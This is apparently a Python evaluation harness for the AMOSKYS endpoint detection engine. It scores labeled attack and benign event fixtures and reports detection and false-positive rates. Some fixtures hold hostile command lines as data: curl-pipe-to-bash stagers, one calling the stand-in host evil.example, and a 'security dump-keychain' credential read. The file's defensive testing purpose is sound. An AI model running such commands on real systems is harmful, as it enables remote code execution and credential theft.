#!/usr/bin/env python3
"""
AMOSKYS Detection Evaluation Harness — the teacher (and the moat seed).

Turns "did detection improve?" from a feeling into a number. Replays a labeled
corpus of attack + benign events through the REAL ScoringEngine and reports
detection rate, false-positive rate, and precision/recall — per technique and
overall — then appends a dated row to EVAL_RESULTS.md so every change is provable.

This is intentionally small and self-contained so it runs TODAY and gives a v0
scorecard (expected: ~0 detection, ~100% benign mislabeled — confirming the
baseline in AMOSKYS_FOUNDATIONS_AND_CALIBRATION). As §3.1 EntityBaseline and
§3.2 risk-reconciliation land, re-run and watch the numbers move.

Run:  PYTHONPATH=src python tools/eval_harness.py
"""
from __future__ import annotations

import json
import os
import sys
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List

REPO = Path(__file__).resolve().parent.parent
RESULTS = REPO / "docs" / "architecture" / "EVAL_RESULTS.md"


# ── Labeled corpus ─────────────────────────────────────────────────────────────
# expect="detect" → a calibrated engine SHOULD flag it (classification != legitimate).
# expect="ignore" → benign; flagging it is a false positive.
# Expand these from REAL captured events (benign/) and red-team replays (attack/).
@dataclass
class Fixture:
    technique: str
    expect: str  # "detect" | "ignore"
    event: Dict[str, Any]


CORPUS: List[Fixture] = [
    # ── ATTACK fixtures (adversary-first: entity + the anomaly that betrays it) ──
    Fixture("T1204.004 ClickFix Terminal paste", "detect", {
        "event_category": "browser_to_terminal", "event_action": "spawn",
        "process_name": "curl", "exe": "/usr/bin/curl", "parent_name": "Terminal",
        "cmdline": "curl -fsSL http://203.0.113.7/x | bash", "risk_score": 0.9,
        "domain": "", "remote_ip": "203.0.113.7", "username": "akash",
    }),
    Fixture("T1059.004 shell one-liner stager", "detect", {
        "event_category": "process_spawned", "event_action": "exec",
        "process_name": "sh", "exe": "/bin/sh", "parent_name": "Safari",
        "cmdline": "/bin/sh -c 'curl evil.example/p|bash'", "risk_score": 0.6,
        "username": "akash",
    }),
    Fixture("T1071.001 C2 beacon to fresh ASN", "detect", {
        "event_category": "c2_beacon_suspect", "event_action": "new_external_connection",
        "process_name": "Notes", "exe": "/System/.../Notes", "remote_ip": "198.51.100.9",
        "asn_dst_org": "BULLETPROOF-AS", "risk_score": 0.6, "protocol": "tcp", "remote_port": 443,
        "username": "akash",
    }),
    Fixture("T1547.011 new LaunchAgent persistence", "detect", {
        "event_category": "new_launch_agent", "event_action": "create",
        "path": "/Users/akash/Library/LaunchAgents/com.evil.plist",
        "change_type": "created", "risk_score": 0.7, "username": "akash",
    }),
    Fixture("T1555 keychain credential read", "detect", {
        "event_category": "credential_harvest", "event_action": "read",
        "process_name": "osascript", "exe": "/usr/bin/osascript",
        "cmdline": "security dump-keychain", "path": "/Users/akash/Library/Keychains/login.keychain-db",
        "risk_score": 0.8, "username": "akash",
    }),
    Fixture("T1496 cryptominer to known-bad IP", "detect", {
        "event_category": "exfil_spike", "event_action": "new_external_connection",
        "process_name": "xmrig", "remote_ip": "185.220.101.1", "threat_intel_match": True,
        "asn_dst_org": "MINING-POOL", "risk_score": 0.7, "username": "akash",
    }),
    # ── BENIGN fixtures (the mailman — must NOT fire) ──
    Fixture("benign DNS to Apple", "ignore", {
        "event_category": "dns_beaconing_detected", "event_action": "query",
        "process_name": "trustd", "domain": "ocsp.apple.com", "risk_score": 0.9998,
        "username": "akash",
    }),
    Fixture("benign Google CDN connection", "ignore", {
        "event_category": "c2_beacon_suspect", "event_action": "new_external_connection",
        "process_name": "Google Chrome", "remote_ip": "142.250.80.0",
        "asn_dst_org": "GOOGLE", "risk_score": 0.6, "remote_port": 443, "username": "akash",
    }),
    Fixture("benign Homebrew python", "ignore", {
        "event_category": "lolbin_execution", "event_action": "exec",
        "process_name": "python3.13", "exe": "/opt/homebrew/.../python3.13",
        "cmdline": "python3.13 -m pip ...", "risk_score": 0.7, "username": "akash",
    }),
    Fixture("benign system_profiler", "ignore", {
        "event_category": "process_spawned", "event_action": "exec",
        "process_name": "system_profiler", "parent_name": "launchd", "risk_score": 0.02,
        "username": "akash",
    }),
]


# ── Scoring bridge ─────────────────────────────────────────────────────────────
def make_scorer():
    """Return a function event->(classification, risk). Uses the REAL ScoringEngine
    if importable; else a passthrough that reads the probe's raw risk_score so the
    harness still produces a v0 scorecard."""
    try:
        from amoskys.intel.scoring import ScoringEngine
        eng = ScoringEngine()

        def score(ev: Dict[str, Any]):
            try:
                out = eng.score_event(dict(ev))
            except Exception:
                out = dict(ev)
            cls = out.get("final_classification", "legitimate")
            # Measure what the LIVE system actually stores/consumes: the canonical
            # risk_score. Before reconciliation this is the probe's raw stamp (the
            # over-attribution); after, it's the scorer's calibrated verdict.
            risk = float(out.get("risk_score", 0.0) or 0.0)
            return cls, float(risk)
        return score, "ScoringEngine"
    except Exception as e:
        def score(ev: Dict[str, Any]):
            r = float(ev.get("risk_score", 0.0) or 0.0)
            return ("malicious" if r >= 0.8 else "suspicious" if r >= 0.4 else "legitimate"), r
        return score, f"passthrough (ScoringEngine unavailable: {e})"


# ── Evaluation ─────────────────────────────────────────────────────────────────
@dataclass
class Score:
    tp: int = 0; fp: int = 0; tn: int = 0; fn: int = 0
    rows: List[str] = field(default_factory=list)


def fired(classification: str, risk: float) -> bool:
    return classification in ("suspicious", "malicious") or risk >= 0.6


def run() -> Score:
    score_fn, backend = make_scorer()
    s = Score()
    print(f"=== AMOSKYS detection eval — backend: {backend} ===\n")
    for fx in CORPUS:
        cls, risk = score_fn(fx.event)
        did_fire = fired(cls, risk)
        want = fx.expect == "detect"
        if want and did_fire: s.tp += 1; verdict = "TP ✓"
        elif want and not did_fire: s.fn += 1; verdict = "FN ✗ MISS"
        elif not want and did_fire: s.fp += 1; verdict = "FP ✗ NOISE"
        else: s.tn += 1; verdict = "TN ✓"
        print(f"  [{verdict:<10}] {fx.technique:<38} -> class={cls:<11} risk={risk:.3f}")
        s.rows.append(verdict)
    return s


def report(s: Score) -> Dict[str, Any]:
    attacks = s.tp + s.fn
    benign = s.tn + s.fp
    det_rate = s.tp / attacks if attacks else 0.0
    fp_rate = s.fp / benign if benign else 0.0
    prec = s.tp / (s.tp + s.fp) if (s.tp + s.fp) else 0.0
    rec = det_rate
    m = {
        "detection_rate": round(det_rate, 3), "false_positive_rate": round(fp_rate, 3),
        "precision": round(prec, 3), "recall": round(rec, 3),
        "tp": s.tp, "fp": s.fp, "tn": s.tn, "fn": s.fn,
        "attacks": attacks, "benign": benign,
    }
    print(f"\n  detection rate : {m['detection_rate']:.0%}  ({s.tp}/{attacks} attacks caught)")
    print(f"  false-pos rate : {m['false_positive_rate']:.0%}  ({s.fp}/{benign} benign flagged)")
    print(f"  precision      : {m['precision']:.0%}    recall: {m['recall']:.0%}")
    return m


def append_results(m: Dict[str, Any], stamp: str) -> None:
    RESULTS.parent.mkdir(parents=True, exist_ok=True)
    new = not RESULTS.exists()
    with RESULTS.open("a") as f:
        if new:
            f.write("# AMOSKYS Detection Eval Results\n\n")
            f.write("One row per run. Beat the row above it. Nothing counts until these move.\n\n")
            f.write("| date | detect_rate | fp_rate | precision | recall | TP | FP | FN | note |\n")
            f.write("|---|---|---|---|---|---|---|---|---|\n")
        f.write(f"| {stamp} | {m['detection_rate']:.0%} | {m['false_positive_rate']:.0%} | "
                f"{m['precision']:.0%} | {m['recall']:.0%} | {m['tp']} | {m['fp']} | {m['fn']} | v0 baseline |\n")
    print(f"\n  appended to {RESULTS}")


if __name__ == "__main__":
    # Date passed in (env) to keep the run deterministic/auditable.
    stamp = os.getenv("AMOSKYS_EVAL_STAMP", "")
    s = run()
    m = report(s)
    if stamp:
        append_results(m, stamp)
    else:
        print("\n  (set AMOSKYS_EVAL_STAMP=YYYY-MM-DD to append a row to EVAL_RESULTS.md)")
    # Exit non-zero if detection is broken — makes this CI-friendly later.
    sys.exit(0 if m["detection_rate"] >= 0.5 and m["false_positive_rate"] <= 0.2 else 1)
